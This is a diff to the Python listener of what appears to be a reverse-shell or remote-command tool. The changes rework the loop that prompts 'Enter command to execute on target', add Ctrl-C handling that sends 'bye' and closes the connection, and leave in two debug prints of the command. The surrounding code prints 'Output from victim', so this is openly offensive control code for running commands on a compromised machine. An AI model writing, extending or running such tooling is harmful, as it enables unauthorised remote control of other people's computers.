@@ -112,12 +112,22 @@ class Listener:
         while True:
             inputChecker = False
             while inputChecker == False:
-                cmd = input(f'{fc.r}Enter command to execute on target:{fc.end}')
-                if cmd == '':
-                    print(f'{fc.rw}Command must not be blank!{fc.end}')
-                else:
-                    inputChecker = True
-            if cmd != 'bye':
+                try:
+                    cmd = input(f'{fc.r}Enter command to execute on target:{fc.end}')
+                    if cmd == '':
+                        print(f'{fc.rw}Command must not be blank!{fc.end}')
+                    else:
+                        inputChecker = True
+                    print(cmd)
+                    cmd = cmd.split(' ')
+                    print(cmd)
+                except KeyboardInterrupt:
+                    self.sendStream(['bye'])
+                    self.listener.close()
+                    exit()
+
+
+            if cmd[0] != 'bye':
                 result = self.executeCmd(cmd)
                 print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long')
                 print(f'{fc.purple}#{fc.end}'*100)
@@ -125,7 +135,7 @@ class Listener:
                 print(f'{fc.purple}#{fc.end}'*100)
             else:
                 print(f'{fc.rw}Exit call received, closing connection{fc.end}')
-                self.sendStream('bye')
+                self.sendStream(cmd)
                 self.listener.close()
                 exit() 
           
@@ -142,7 +152,8 @@ except Exception as e:
 
 
 except KeyboardInterrupt:
-    print('Interrupt caught, exiting...')
+    print(f'{fc.rw}Interrupt caught, exiting...{fc.end}')
     sys.exit()
+
 
 
